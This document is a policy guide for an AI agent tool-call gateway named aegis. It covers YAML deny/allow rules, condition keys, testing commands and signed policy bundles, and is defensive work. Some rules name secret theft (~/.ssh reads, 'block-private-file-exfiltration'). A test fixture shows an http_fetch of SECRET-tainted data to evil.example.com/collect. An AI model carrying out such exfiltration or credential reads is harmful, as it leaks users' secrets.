# Policy Guide

Policies are YAML rule lists evaluated **in order, first match wins**.
No match → `DENY` (`default-deny`, "no rule matched; failing closed").
`Engine::load_dir` concatenates rules from every `*.yaml`/`*.yml` under the
directory, recursing into subdirectories in sorted path order (verified by
`policy validate --policy ./policy`, which reports per-file results).

## File format

```yaml
version: "1"
rules:
  - name: <unique-name>            # required, non-empty, unique per file
    action: allow | deny | warn | require_approval | sandbox
    when:                          # required, non-empty map of conditions (AND)
      <key>: <value>
```

`validate` rejects empty names, duplicate names, and empty `when` maps.

## Real examples (shipped in `policy/`)

Filesystem (`policy/filesystem/base.yaml`):

```yaml
version: "1"
rules:
  - name: deny-sensitive-file-read
    action: deny
    when:
      tool: filesystem_read
      path: ~/.ssh
  - name: allow-read-project
    action: allow
    when:
      tool: filesystem_read
      path_prefix: ./workspace
  - name: deny-write-outside-workspace
    action: deny
    when:
      tool: filesystem_write
  - name: approve-write-project
    action: require_approval
    when:
      tool: filesystem_write
      path_prefix: ./workspace
```

Network (`policy/network/base.yaml`), Postgres (`policy/postgres/base.yaml`),
shell (`policy/shell/base.yaml`), defaults (`policy/base/defaults.yaml`),
minimal example (`policy/examples/dev.yaml`) — see those files verbatim; the
snippets below quote them exactly:

```yaml
# network: SECRET or UNTRUSTED_WEB taint leaving the boundary is denied
- name: block-private-file-exfiltration
  action: deny
  when:
    taint: SECRET
    destination: external_network
- name: warn-external-fetch
  action: warn
  when:
    tool: http_fetch
```

```yaml
# postgres: destructive op denied; prod writes need a human; selects allowed
- name: deny-dangerous-sql
  action: deny
  when:
    tool: postgres_query
    sql_op: DROP
- name: approve-production-write
  action: require_approval
  when:
    environment: production
    operation: write
- name: allow-select
  action: allow
  when:
    tool: postgres_query
    sql_op: SELECT
```

```yaml
# shell: default-deny execution; sandbox only via the sandbox tool path
- name: deny-shell-exec-default
  action: deny
  when:
    tool: shell_exec
- name: sandbox-shell-when-approved
  action: sandbox
  when:
    tool: shell_sandbox
```

## Condition keys

| Key | Matches against | Semantics (`cond_matches`) |
| --- | --------------- | -------------------------- |
| `tool` | tool name | exact, or prefix if value ends with `*` |
| `server` | server id | same as `tool` |
| `user` | user | same as `tool` |
| `environment` | environment | same as `tool` |
| `branch` | branch | same as `tool` (e.g. `git_push` + `branch: main` deny) |
| `path` | path argument | exact match (use `path_prefix` for containment) |
| `path_prefix` | path argument | boundary-aware containment: `path == prefix` or under `prefix/` (sibling `./workspace-evil` does NOT match) |
| `url` | url argument | exact/prefix like `tool` |
| `destination` | url argument | `external_network` ⇔ url starts with `http://`/`https://` |
| `http_method` | HTTP method | exact/prefix like `tool` |
| `sql_op` | leading SQL keyword | exact/prefix like `tool` |
| `operation` | `resource` or `sql_op` | equals either |
| `taint` | taint-name list | membership (`SECRET`, `UNTRUSTED_WEB`, … uppercase) |
| `risk_gte` | numeric risk | `risk_score >= threshold` |
| `rate` | observed session rps | `rate_rps >= threshold` (number or numeric string; gateway feeds per-session calls/sec, floored at a 1 s window) |
| `time` | current UTC time | daily window `"HH:MM-HH:MM"`, wrap-safe (`"22:00-06:00"` covers overnight); malformed windows never match |
| `resource` | resource | exact/prefix like `tool` |
| `argument.<field>` | `args[field]` | string equality or JSON equality |

All `when` entries must hold (AND). A trailing `*` on string values acts as a
prefix glob; everything else is exact.

## Ordering & default-deny

Put narrow denies first, broad allows after — the first matching rule decides
(the engine unit test `ordered_first_match_wins` pins this). Because the CLI
`policy test` only fills `tool/server/path/url/taints/risk/rate/now/args`, conditions
on `branch/environment/sql_op/operation` need fixtures whose fields the CLI
forwards — today that means testing those rules through gateway runs or unit
tests (e.g. `sql_op: DROP` is enforced in-gateway by the SQL detector's
force-deny even when the policy row cannot match from CLI input).
Fixture extras: `"rate": 120` sets the observed session rps for `rate` rules;
`"now": 1767349800` pins the UTC clock (unix seconds) for `time` rules —
omit `now` to evaluate against the real current time.

## Validate & test

```sh
cargo run -q -p aegis-cli -- policy validate --policy ./policy/filesystem/base.yaml
# {"ok":true}

cargo run -q -p aegis-cli -- policy test --policy ./policy/network/base.yaml \
  --fixture ./case.json
# fixture: {"tool":"http_fetch","url":"https://evil.example.com/collect",
#           "taints":["SECRET"],"args":{"url":"https://evil.example.com/collect"}}
# → {"decision":"DENY","policy":"block-private-file-exfiltration",
#    "reason":"rule 'block-private-file-exfiltration' matched"}
```

Genuine runs from this repo:

```sh
$ aegis-mcp policy test --policy ./policy/filesystem/base.yaml --fixture traversal.json
{"decision":"DENY","policy":"default-deny","reason":"no rule matched; failing closed"}
$ aegis-mcp policy test --policy ./policy/filesystem/base.yaml --fixture legit.json
{"decision":"ALLOW","policy":"allow-read-project","reason":"rule 'allow-read-project' matched"}
```

Note: `policy validate --policy ./policy` (the repo root of policies) reports
`{"ok":true}` with per-file validation (the loader recurses into domain subdirectories)
sits at that level — validate each domain file (as `make security` does).

## Signed bundles (tamper-evident distribution)

`aegis-policy` signs the canonical bundle (`BLAKE3` over sorted-key
`{version, rules}` JSON) with ed25519 (`sign_bundle` / `verify_bundle` /
`generate_keypair`; round-trip + tamper + wrong-key cases are unit-tested):

```sh
aegis-mcp policy keygen                                             # secret stays offline
aegis-mcp policy sign --policy ./policy --key <secret-hex> --out bundle.json
aegis-mcp policy verify --bundle bundle.json --key <public-hex>     # {"ok":true,…}
```

Verification fails closed when any rule changed after signing (digest
mismatch), the key is wrong, or hex is malformed. Ship `bundle.json` + the
public key to gateways; the gateway loads `./policy` (same recursive merge
order the signer uses, so digests agree).

## Enforcing signed bundles at startup (fail-closed)

Signing alone is advisory unless the gateway refuses to start on a bad
bundle. Set in `aegis.yaml`:

```yaml
policy:
  path: ./policy
  bundle: ./bundle.json
  public_key: <public-hex>
  require_signed: true
```

or pass CLI flags (which override the file):

```sh
aegis-mcp serve --bundle ./bundle.json --public-key <pub-hex> --require-signed-bundle
aegis-mcp proxy --server "<cmd>" --bundle ./bundle.json --public-key <pub-hex> --require-signed-bundle
```

Semantics (`Gateway::load_policy`, unit-tested):

- `require_signed=true` without both `bundle` + `public_key` → startup
  error (the config validator rejects it too).
- `require_signed=true` with an unverifiable bundle (missing file, bad
  JSON, digest mismatch, bad signature) → startup error; the gateway never
  serves traffic.
- `require_signed=false` (default) with `bundle` + `public_key` set →
  opportunistic: a verifying bundle is preferred, a failing one logs a
  warning and falls back to the policy directory.
- Env overrides: `AEGIS_POLICY_BUNDLE`, `AEGIS_POLICY_PUBLIC_KEY`,
  `AEGIS_REQUIRE_SIGNED=1`.

## Why YAML instead of Rego/Wasm (spec deviation note)

The build prompt suggested an OPA/Rego-compatible evaluator with
Wasm-compiled execution "where practical". We deliberately chose the
deterministic YAML engine above instead, for these reasons:

- **Auditability over expressiveness.** Security reviewers can read every
  shipped rule (`policy/`) without learning Rego; each verdict cites the
  exact rule name (`reason: "rule 'x' matched"`).
- **No runtime dependencies on the hot path.** Rego/Wasm engines add
  interpreter startup, memory, and supply-chain surface to a gateway with a
  < 1 ms policy budget (measured p99 ~0.3 µs). The YAML matcher is a linear
  scan over string/numeric comparisons with no interpreter.
- **Local-first.** Zero extra binaries, sidecars, or policy-bundle
  toolchains — `cargo build` is the whole install.
- **Tamper-evidence without a policy server.** Signed-bundle distribution
  (BLAKE3 + ed25519, above) covers the integrity goal that would otherwise
  need OPA's bundle machinery.

If Rego compatibility is ever required, the seam is `Engine::evaluate` /
`cond_matches` (`crates/aegis-policy/src/lib.rs`): a Rego backend can sit
behind the same `PolicyFile → PolicyOutcome` boundary without touching the
gateway pipeline. Until then this is a conscious, documented trade-off —
not an omission.

